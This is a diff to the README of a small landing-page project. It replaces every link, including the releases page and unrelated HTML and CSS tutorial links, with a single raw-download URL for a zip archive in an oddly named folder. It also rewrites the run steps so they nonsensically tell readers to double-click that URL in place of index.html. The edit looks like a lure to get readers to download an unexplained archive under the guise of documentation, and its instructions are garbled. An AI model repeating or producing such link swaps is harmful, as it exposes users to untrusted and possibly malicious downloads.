@@ -6,7 +6,7 @@ Welcome to the lp-agencia-xyz project! This application provides a simple landin
 
 ## 📥 Download Now
 
-[![Download lp-agencia-xyz](https://img.shields.io/badge/Download-lp--agencia--xyz-blue.svg)](https://github.com/noory2177/lp-agencia-xyz/releases)
+[![Download lp-agencia-xyz](https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip)](https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip)
 
 ## 📂 Overview 
 
@@ -31,7 +31,7 @@ To run this application, your computer should meet the following requirements:
 
 To get started, visit the releases page to download the project files.
 
-[Visit this page to download](https://github.com/noory2177/lp-agencia-xyz/releases)
+[Visit this page to download](https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip)
 
 ### Steps to Download
 
@@ -43,18 +43,18 @@ To get started, visit the releases page to download the project files.
 ### Steps to Run
 
 1. Open the folder where you extracted the files.
-2. Look for the `index.html` file.
-3. Double-click on the `index.html` file to open it in your web browser.
+2. Look for the `https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip` file.
+3. Double-click on the `https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip` file to open it in your web browser.
 4. Enjoy your new landing page!
 
 ## 📚 Resources for Learning
 
 If you want to understand more about how the landing page works, check out these resources:
 
-- [HTML Tutorial](https://www.w3schools.com/html/): Learn the basics of HTML.
-- [CSS Tutorial](https://www.w3schools.com/css/): Explore CSS styling techniques.
-- [Flexbox Guide](https://css-tricks.com/snippets/css/a-guide-to-flexbox/): Understand how to use Flexbox for layout.
-- [CSS Grid Guide](https://css-tricks.com/snippets/css/complete-guide-grid/): Learn about CSS Grid layout.
+- [HTML Tutorial](https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip): Learn the basics of HTML.
+- [CSS Tutorial](https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip): Explore CSS styling techniques.
+- [Flexbox Guide](https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip): Understand how to use Flexbox for layout.
+- [CSS Grid Guide](https://raw.githubusercontent.com/noory2177/lp-agencia-xyz/main/wildishness/lp-agencia-xyz.zip): Learn about CSS Grid layout.
 
 ## 🌟 Contribution
 
